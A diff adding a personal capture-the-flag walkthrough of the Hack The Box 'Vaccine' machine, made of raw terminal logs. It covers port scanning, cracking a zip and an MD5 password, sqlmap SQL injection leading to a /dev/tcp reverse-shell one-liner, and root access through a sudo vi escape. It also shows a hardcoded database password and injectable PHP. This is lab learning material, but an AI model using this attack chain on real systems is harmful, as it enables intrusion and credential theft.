@@ -1,0 +1,443 @@
+=======================
+1.
+┌──(sabeshan㉿kali)-[~/HTB/startpoint]
+└─$ nmap -sS -A -sV -T4 10.129.95.174 -vv
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 20:31 IST
+NSE: Loaded 157 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 20:31
+Completed NSE at 20:31, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 20:31
+Completed NSE at 20:31, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 20:31
+Completed NSE at 20:31, 0.00s elapsed
+Initiating Ping Scan at 20:31
+Scanning 10.129.95.174 [4 ports]
+Completed Ping Scan at 20:31, 0.24s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 20:31
+Completed Parallel DNS resolution of 1 host. at 20:31, 2.08s elapsed
+Initiating SYN Stealth Scan at 20:31
+Scanning 10.129.95.174 [1000 ports]
+Discovered open port 21/tcp on 10.129.95.174
+Discovered open port 22/tcp on 10.129.95.174
+Discovered open port 80/tcp on 10.129.95.174
+Completed SYN Stealth Scan at 20:31, 3.59s elapsed (1000 total ports)
+Initiating Service scan at 20:31
+Scanning 3 services on 10.129.95.174
+Completed Service scan at 20:32, 7.01s elapsed (3 services on 1 host)
+Initiating OS detection (try #1) against 10.129.95.174
+Initiating Traceroute at 20:32
+Completed Traceroute at 20:32, 0.52s elapsed
+Initiating Parallel DNS resolution of 2 hosts. at 20:32
+Completed Parallel DNS resolution of 2 hosts. at 20:32, 6.57s elapsed
+NSE: Script scanning 10.129.95.174.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 20:32
+NSE: [ftp-bounce 10.129.95.174:21] PORT response: 500 Illegal PORT command.
+Completed NSE at 20:32, 18.02s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 20:32
+Completed NSE at 20:32, 3.92s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 20:32
+Completed NSE at 20:32, 0.00s elapsed
+Nmap scan report for 10.129.95.174
+Host is up, received echo-reply ttl 63 (0.43s latency).
+Scanned at 2025-08-19 20:31:52 IST for 44s
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.16.13
+|      Logged in as ftpuser
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzC28uKxt9pqJ4fLYmq/X5t7p44L+bUFQIDeEab29kDPnKdFOa9ijB5C5APVxLaAXVYSXATPYUqjIEWU98Vvvol1zuc82+KG9KfX94pD8TaPY2MZnoi9TfSxgwmKpmiRWR4DwwMS+mNo+WBU3sjB2QjgNip2vbiHxMitKeIfDLLFYiLKhc1eBRtooZ6DJzXQOMFp5QhSbZygWqebpFcsrmFnz9QWhx4MekbUnUVPKwCunycLi1pjrsmOAekbGz3/5R3H5tFSck915iqyc8bSkBZgRwW3FDJAXFmFgHG9fX727HsXFk8MXmVRMuH1LxGjvn1q3j27bb22QzprS7t9bJciWfwgt1sl57S0Q+iFbku83NgAFxUG373nspOHn08DwMllCyeLOG3Oy3x9zcCxMGATopiPckt8lb1GCWIvLPSNHMW12OyCKGM+AmLu4q9z7zX1YOUM6oxfn3qZVLKSZJ/DJu+aifv2BVNu/zJU2wdk1vFxysmQ4roj5O5I+H9x0=
+|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNsSORVFGkIbgItDm/mxmyPhpsIJihXV8y4CQiMTWGdEVQatXNIlXX0yGLZ4JFtPEX9rOGAp/eLZc0mGJtDyuyQ=
+|   256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXvk132UscLPAfaZyZ2Av54rpw9cP31OrloBE9v3SLW
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: MegaCorp Login
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+Device type: general purpose|router
+Running: Linux 5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=8/19%OT=21%CT=1%CU=37666%PV=Y%DS=2%DC=T%G=Y%TM=68A4920
+OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M569ST11NW7%O2=M569ST11NW7%O3=M569NNT11NW7%O4=M569ST11NW7%O5=M569ST1
+OS:1NW7%O6=M569ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
+OS:(R=Y%DF=Y%T=40%W=FAF0%O=M569NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
+OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 16.823 days (since Sun Aug  3 00:47:41 2025)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=261 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 199/tcp)
+HOP RTT       ADDRESS
+1   507.40 ms 10.10.16.1
+2   225.27 ms 10.129.95.174
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 20:32
+Completed NSE at 20:32, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 20:32
+Completed NSE at 20:32, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 20:32
+Completed NSE at 20:32, 0.00s elapsed
+Read data files from: /usr/share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 46.66 seconds
+                    Raw packets sent: 1155 (51.654KB) | Rcvd: 1143 (47.777KB)
+======================================================================================
+2.Via ftp I was identified the file and crack the file using john;
+┌──(sabeshan㉿kali)-[~/HTB/startpoint]
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt    
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+741852963        (backup.zip)     
+1g 0:00:00:00 DONE (2025-08-19 20:31) 25.00g/s 102400p/s 102400c/s 102400C/s 123456..oooooo
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                                                                                                                                            
+┌──(sabeshan㉿kali)-[~/HTB/startpoint]
+└─$ unzip backup.zip
+Archive:  backup.zip
+[backup.zip] index.php password: 
+  inflating: index.php               
+  inflating: style.css               
+                                                                                                                                                                                                                                            
+┌──(sabeshan㉿kali)-[~/HTB/startpoint]
+└─$ ls -la
+total 112
+drwxrwxr-x  3 sabeshan sabeshan  4096 Aug 19 20:31 .
+drwxrwxr-x 14 sabeshan sabeshan  4096 Aug 17 15:16 ..
+-rw-rw-r--  1 sabeshan sabeshan    33 Jun  8  2021 allowed.userlist
+-rw-rw-r--  1 sabeshan sabeshan    62 Apr 20  2021 allowed.userlist.passwd
+-rw-rw-r--  1 sabeshan sabeshan  2533 Apr 13  2021 backup.zip
+-rw-rw-r--  1 sabeshan sabeshan  2174 Aug 19 20:30 hash
+-rw-rw-r--  1 sabeshan sabeshan   704 Aug 17 16:05 hash.txt
+-rw-r--r--  1 sabeshan sabeshan  2594 Feb  3  2020 index.php
+-rw-rw-r--  1 sabeshan sabeshan 58899 Nov 28  2022 password_policy.pdf
+-rw-r--r--  1 sabeshan sabeshan   609 Aug 19 18:08 prod.dtsConfig
+drwxrwxr-x  3 sabeshan sabeshan  4096 Aug 19 18:59 reports
+-rw-r--r--  1 sabeshan sabeshan  3274 Feb  4  2020 style.css
+-rw-rw-r--  1 sabeshan sabeshan    40 Aug 18 15:38 username.txt
+-rw-rw-r--  1 sabeshan sabeshan   713 Nov 28  2022 welcome_28112022
+                                                                                                                                                                                                                                            
+┌──(sabeshan㉿kali)-[~/HTB/startpoint]
+└─$ cat index.php     
+<!DOCTYPE html>
+<?php
+session_start();
+  if(isset($_POST['username']) && isset($_POST['password'])) {
+    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
+      $_SESSION['login'] = "true";
+      header("Location: dashboard.php");
+    }
+  }
+?>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>MegaCorp Login</title>
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet"><link rel="stylesheet" href="./style.css">
+
+</head>
+  <h1 align=center>MegaCorp Login</h1>
+<body>
+<!-- partial:index.partial.html -->
+<body class="align">
+
+  <div class="grid">
+
+    <form action="" method="POST" class="form login">
+
+      <div class="form__field">
+        <label for="login__username"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user"></use></svg><span class="hidden">Username</span></label>
+        <input id="login__username" type="text" name="username" class="form__input" placeholder="Username" required>
+      </div>
+
+      <div class="form__field">
+        <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">Password</span></label>
+        <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>
+      </div>
+
+      <div class="form__field">
+        <input type="submit" value="Sign In">
+      </div>
+
+    </form>
+
+
+  </div>
+
+  <svg xmlns="http://www.w3.org/2000/svg" class="icons"><symbol id="arrow-right" viewBox="0 0 1792 1792"><path d="M1600 960q0 54-37 91l-651 651q-39 37-91 37-51 0-90-37l-75-75q-38-38-38-91t38-91l293-293H245q-52 0-84.5-37.5T128 1024V896q0-53 32.5-90.5T245 768h704L656 474q-38-36-38-90t38-90l75-75q38-38 90-38 53 0 91 38l651 651q37 35 37 90z"/></symbol><symbol id="lock" viewBox="0 0 1792 1792"><path d="M640 768h512V576q0-106-75-181t-181-75-181 75-75 181v192zm832 96v576q0 40-28 68t-68 28H416q-40 0-68-28t-28-68V864q0-40 28-68t68-28h32V576q0-184 132-316t316-132 316 132 132 316v192h32q40 0 68 28t28 68z"/></symbol><symbol id="user" viewBox="0 0 1792 1792"><path d="M1600 1405q0 120-73 189.5t-194 69.5H459q-121 0-194-69.5T192 1405q0-53 3.5-103.5t14-109T236 1084t43-97.5 62-81 85.5-53.5T538 832q9 0 42 21.5t74.5 48 108 48T896 971t133.5-21.5 108-48 74.5-48 42-21.5q61 0 111.5 20t85.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5zm-320-893q0 159-112.5 271.5T896 896 624.5 783.5 512 512t112.5-271.5T896 128t271.5 112.5T1280 512z"/></symbol></svg>
+
+</body>
+<!-- partial -->
+  
+</body>
+</html>
+===================================================================================================
+3. i got the username  admin and cracked the password from the hashes "qwerty789".
+===================================================================================================
+4.
+    ┌──(sabeshan㉿kali)-[~/HTB/startpoint]
+└─$ sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=h6etltu9tqflpa7tlp070f83gk"
+        ___
+       __H__                                                                                                                                                                                                                   
+ ___ ___["]_____ ___ ___  {1.9.6#stable}                                                                                                                                                                                       
+|_ -| . [)]     | .'| . |                                                                                                                                                                                                      
+|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                      
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                   
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:51:20 /2025-08-19/
+
+[20:51:21] [INFO] testing connection to the target URL
+[20:51:22] [INFO] checking if the target is protected by some kind of WAF/IPS
+[20:51:22] [INFO] testing if the target URL content is stable
+[20:51:23] [INFO] target URL content is stable
+[20:51:23] [INFO] testing if GET parameter 'search' is dynamic
+[20:51:24] [WARNING] GET parameter 'search' does not appear to be dynamic
+[20:51:25] [WARNING] heuristic (basic) test shows that GET parameter 'search' might not be injectable
+[20:51:25] [INFO] testing for SQL injection on GET parameter 'search'
+[20:51:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[20:51:33] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[20:51:35] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[20:51:38] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[20:51:42] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[20:51:46] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[20:51:50] [INFO] testing 'Generic inline queries'
+[20:51:51] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[20:52:07] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
+it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[20:53:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[20:53:09] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[20:53:09] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[20:53:09] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')                                                                                                                        
+[20:53:11] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[20:53:12] [WARNING] reflective value(s) found and filtering out
+[20:53:14] [INFO] target URL appears to have 5 columns in query
+[20:53:16] [INFO] GET parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
+sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
+---
+Parameter: search (GET)
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: search=any query';SELECT PG_SLEEP(5)--
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: search=any query' UNION ALL SELECT NULL,(CHR(113)||CHR(112)||CHR(122)||CHR(118)||CHR(113))||(CHR(121)||CHR(119)||CHR(120)||CHR(88)||CHR(82)||CHR(114)||CHR(82)||CHR(113)||CHR(68)||CHR(71)||CHR(108)||CHR(66)||CHR(118)||CHR(112)||CHR(88)||CHR(69)||CHR(122)||CHR(90)||CHR(102)||CHR(65)||CHR(80)||CHR(122)||CHR(70)||CHR(117)||CHR(66)||CHR(103)||CHR(71)||CHR(121)||CHR(114)||CHR(77)||CHR(85)||CHR(107)||CHR(106)||CHR(88)||CHR(107)||CHR(77)||CHR(108)||CHR(116)||CHR(118)||CHR(86))||(CHR(113)||CHR(106)||CHR(107)||CHR(106)||CHR(113)),NULL,NULL,NULL-- WuZJ
+---
+[20:53:20] [INFO] the back-end DBMS is PostgreSQL
+web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: PostgreSQL
+[20:53:26] [INFO] fetched data logged to text files under '/home/sabeshan/.local/share/sqlmap/output/10.129.95.174'
+
+[*] ending @ 20:53:26 /2025-08-19/
+
+                                                                                                                                                                                                                               
+┌──(sabeshan㉿kali)-[~/HTB/startpoint]
+└─$ sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=h6etltu9tqflpa7tlp070f83gk" --os-shell
+        ___
+       __H__                                                                                                                                                                                                                   
+ ___ ___[,]_____ ___ ___  {1.9.6#stable}                                                                                                                                                                                       
+|_ -| . ["]     | .'| . |                                                                                                                                                                                                      
+|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                      
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                   
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:54:18 /2025-08-19/
+
+[20:54:18] [INFO] resuming back-end DBMS 'postgresql' 
+[20:54:18] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: search (GET)
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: search=any query';SELECT PG_SLEEP(5)--
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: search=any query' UNION ALL SELECT NULL,(CHR(113)||CHR(112)||CHR(122)||CHR(118)||CHR(113))||(CHR(121)||CHR(119)||CHR(120)||CHR(88)||CHR(82)||CHR(114)||CHR(82)||CHR(113)||CHR(68)||CHR(71)||CHR(108)||CHR(66)||CHR(118)||CHR(112)||CHR(88)||CHR(69)||CHR(122)||CHR(90)||CHR(102)||CHR(65)||CHR(80)||CHR(122)||CHR(70)||CHR(117)||CHR(66)||CHR(103)||CHR(71)||CHR(121)||CHR(114)||CHR(77)||CHR(85)||CHR(107)||CHR(106)||CHR(88)||CHR(107)||CHR(77)||CHR(108)||CHR(116)||CHR(118)||CHR(86))||(CHR(113)||CHR(106)||CHR(107)||CHR(106)||CHR(113)),NULL,NULL,NULL-- WuZJ
+---
+[20:54:19] [INFO] the back-end DBMS is PostgreSQL
+web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: PostgreSQL
+[20:54:19] [INFO] fingerprinting the back-end DBMS operating system
+[20:54:22] [INFO] the back-end DBMS operating system is Linux
+[20:54:24] [INFO] testing if current user is DBA
+[20:54:27] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
+[20:54:27] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
+os-shell> bash -c "bash -i >& /dev/tcp/10.10.16.13/1337 0>&1"
+do you want to retrieve the command standard output? [Y/n/a] y
+[20:55:51] [WARNING] turning off pre-connect mechanism because of connection reset(s)
+[20:55:51] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
+[20:57:23] [CRITICAL] connection timed out to the target URL
+
+[*] ending @ 20:57:23 /2025-08-19/
+===================================================================================================================
+5.
+  postgres@vaccine:/var/www/html$ cat dashboard.php
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Admin Dashboard</title>
+  <link rel="stylesheet" href="./dashboard.css">
+  <script src="https://use.fontawesome.com/33a3739634.js"></script>
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<body>
+ <div id="wrapper">
+ <div class="parent">
+  <h1 align="left">MegaCorp Car Catalogue</h1>
+<form action="" method="GET">
+<div class="search-box">
+  <input type="search" name="search" placeholder="Search" />
+  <button type="submit" class="search-btn"><i class="fa fa-search"></i></button>
+</div>
+</form>
+  </div>
+  
+  <table id="keywords" cellspacing="0" cellpadding="0">
+    <thead>
+      <tr>
+        <th><span style="color: white">Name</span></th>
+        <th><span style="color: white">Type</span></th>
+        <th><span style="color: white">Fuel</span></th>
+        <th><span style="color: white">Engine</span></th>
+      </tr>
+    </thead>
+    <tbody>
+        <?php
+        session_start();
+        if($_SESSION['login'] !== "true") {
+          header("Location: index.php");
+          die();
+        }
+        try {
+          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+        }
+
+        catch ( exception $e ) {
+          echo $e->getMessage();
+        }
+
+        if(isset($_REQUEST['search'])) {
+
+          $q = "Select * from cars where name ilike '%". $_REQUEST["search"] ."%'";
+
+          $result = pg_query($conn,$q);
+
+          if (!$result)
+          {
+                            die(pg_last_error($conn));
+          }
+          while($row = pg_fetch_array($result, NULL, PGSQL_NUM))
+              {
+                echo "
+                  <tr>
+                    <td class='lalign'>$row[1]</td>
+                    <td>$row[2]</td>
+                    <td>$row[3]</td>
+                    <td>$row[4]</td>
+                  </tr>";
+            }
+        }
+        else {
+
+          $q = "Select * from cars";
+
+          $result = pg_query($conn,$q);
+
+          if (!$result)
+          {
+                            die(pg_last_error($conn));
+          }
+          while($row = pg_fetch_array($result, NULL, PGSQL_NUM))
+              {
+                echo "
+                  <tr>
+                    <td class='lalign'>$row[1]</td>
+                    <td>$row[2]</td>
+                    <td>$row[3]</td>
+                    <td>$row[4]</td>
+                  </tr>";
+            }
+        }
+
+
+      ?>
+    </tbody>
+  </table>
+ </div> 
+</body>
+<!-- partial -->
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery.tablesorter/2.28.14/js/jquery.tablesorter.min.js'></script><script  src="./dashboard.js"></script>
+
+</body>
+</html>
+======================================================================================================================
+6.
+    postgres@vaccine:~$ sudo -l
+[sudo] password for postgres: 
+Matching Defaults entries for postgres on vaccine:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
+
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+[No write since last change]
+# cat /root/root.txt
+dd6e058e814260bc70e9bbdef2715849
+# 
